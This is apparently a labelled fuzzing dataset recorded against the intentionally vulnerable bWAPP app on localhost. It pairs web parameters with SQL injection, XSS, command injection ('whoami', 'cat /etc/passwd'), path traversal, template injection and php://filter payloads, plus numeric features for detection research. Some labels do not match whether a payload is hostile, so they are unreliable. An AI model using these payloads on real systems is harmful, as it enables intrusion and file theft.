label,url,param,payload,risk_level,v1,v2,v3,v4,v5,v6,v7,v8,v9,v10,v11,v12,v13
0,http://127.0.0.1/bWAPP/app/login.php,login,sample_input,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/credits.php,bug,C:\Windows\win.ini,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,login,<body onload=alert(1)>,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,security_level,`whoami`,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,login,test12345,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,%27%20%20%20,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/credits.php,bug,`whoami`,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,security_level,abc,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,login,test_safe_string,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/credits.php,bug,abc,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,& ping -c 1 127.0.0.1,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,security_level,abc #,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,login,test_safe_string ,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,security_level,abc # -- ,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/credits.php,bug,abc #,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,& whoami,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,login,test_safe_string    ,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,security_level,abc -- ,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,login,<iframe src=javascript:alert(1)></iframe>,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/credits.php,bug,abc # -- ,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,',normal,0.0,0.0,0.0,0.2,1.0,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,security_level,active,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,login,test_safe_string    %00,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/credits.php,bug,abc -- ,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,'   ,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,login,<img src=x onerror=alert(1)>,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,security_level,done,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,login,user001,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,security_level,hello_world,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/credits.php,bug,active,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,' #,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,login,user002,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,security_level,inactive,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/credits.php,bug,done,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,login,user003,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,DATABASE(),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --",normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/credits.php,bug,hello_world,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,login,user004,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,' AND sleep(5) --,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/credits.php,bug,inactive,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,login,<script>alert(1)</script>,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,login,user005,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,' OR 1=1 --,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,login,<svg/onload=alert(1)>,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,login,{{7*7}},high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,"' UNION SELECT 1,2,3,4,5 --",normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,login,C:\Windows\win.ini,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,login,{{config}},high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,security_level,javascript:alert(1),high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,login,`whoami`,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,login,| type C:\Windows\win.ini,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/credits.php,bug,javascript:alert(1),normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,security_level,normaltext,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,login,abc,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,login,| whoami,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,security_level,ok,high,0.0,0.0,0.0,0.2,1.0,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,login,abc #,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/credits.php,bug,normaltext,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,login,|| whoami,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,security_level,php://filter/convert.base64-encode/resource=index.php,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,login,abc # -- ,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/credits.php,bug,ok,normal,0.0,0.0,0.0,0.2,1.0,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,security_level,random_user_name,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,login,abc -- ,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/credits.php,bug,php://filter/convert.base64-encode/resource=index.php,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/login.php,password,"""",high,0.0,0.0,0.0,0.0,1.0,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,security_level,ready,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,login,active,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/credits.php,bug,random_user_name,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,password,""" OR 1=1 --",high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,security_level,sample_input,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,login,done,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,"'""><script>alert(1)</script>",normal,0.0,0.0,0.0005615234375,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/credits.php,bug,ready,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,password,${7*7},high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,security_level,test12345,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/sqli_16.php,login,hello_world,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,') OR ('1'='1,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/credits.php,bug,sample_input,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,password,%27%20%20%20,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,security_level,test_safe_string,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,login,inactive,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,../../../../../../../../etc/passwd,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/credits.php,bug,test12345,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,password,& ping -c 1 127.0.0.1,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,security_level,test_safe_string ,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,..\..\..\..\..\..\..\..\windows\win.ini,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,security_level,test_safe_string    ,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,password,& whoami,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,/etc/passwd,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/credits.php,bug,test_safe_string,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,security_level,test_safe_string    %00,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,password,',high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,0,normal,0.0,0.0,0.0,0.2,1.0,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,security_level,user001,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/credits.php,bug,test_safe_string ,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,password,'   ,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,0  ,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,security_level,user002,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/credits.php,bug,test_safe_string    ,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,password,' #,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,security_level,user003,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,0 -- ,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/credits.php,bug,test_safe_string    %00,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,login,javascript:alert(1),high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,security_level,user004,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,password,"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,DATABASE(),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --",high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,0%00,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,security_level,user005,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,login,normaltext,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,password,' AND sleep(5) --,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,1,normal,0.0,0.0,0.0,0.2,1.0,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,security_level,{{7*7}},high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,password,' OR 1=1 --,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/sqli_16.php,login,ok,high,0.0,0.0,0.0,0.2,1.0,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/credits.php,bug,user001,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,1 #,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,security_level,{{config}},high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,password,"' UNION SELECT 1,2,3,4,5 --",high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,login,php://filter/convert.base64-encode/resource=index.php,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,1 -- ,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,security_level,| type C:\Windows\win.ini,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/credits.php,bug,user002,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,login,random_user_name,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,security_level,| whoami,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,1%00,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/sqli_16.php,login,ready,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/credits.php,bug,user003,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,security_level,|| whoami,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,1' AND 1=1 #,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,login,sample_input,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/credits.php,bug,user004,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,password,"'""><script>alert(1)</script>",high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,1' AND 1=2 #,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,login,test12345,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/credits.php,bug,user005,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,bug,"""",high,0.0,0.0,0.0,0.2,1.0,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,2023-10-27,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/sqli_16.php,login,test_safe_string,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,password,') OR ('1'='1,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/credits.php,bug,{{7*7}},normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,; cat /etc/passwd,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,login,test_safe_string ,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/credits.php,bug,{{config}},normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,password,../../../../../../../../etc/passwd,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,login,test_safe_string    ,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/xss_stored_1.php,security_level,; whoami,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/credits.php,bug,| type C:\Windows\win.ini,normal,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/bWAPP/app/login.php,password,..\..\..\..\..\..\..\..\windows\win.ini,high,0.0,0.0,0.0,0.0,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/sqli_16.php,login,test_safe_string    %00,high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/bWAPP/app/unrestricted_file_upload.php,bug,""" OR 1=1 --",high,0.0,0.0,0.0,0.2,1.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
